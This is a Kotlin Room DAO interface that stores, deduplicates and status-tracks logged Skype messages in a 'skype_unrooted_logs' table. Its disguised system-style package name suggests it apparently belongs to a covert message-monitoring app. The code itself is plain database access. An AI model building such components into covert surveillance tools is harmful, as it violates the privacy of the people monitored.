package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.SkypeUnrooted

@Dao
interface SkypeUnrootedDao {
    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(skypeUnrooted: SkypeUnrooted)

    @Query("SELECT uniqueId from skype_unrooted_logs where uniqueId = :messageId")
    fun checkIfAlreadyExist(messageId:String):String?

    @Query("SELECT * from skype_unrooted_logs where status = :status")
    fun selectAllSkypeUnrootedLogs(status:Int):List<SkypeUnrooted>

    @Query("UPDATE skype_unrooted_logs set status = :updated_status where id between :startId and :endId")
    fun update(startId:Int , endId:Int,updated_status:Int):Int

}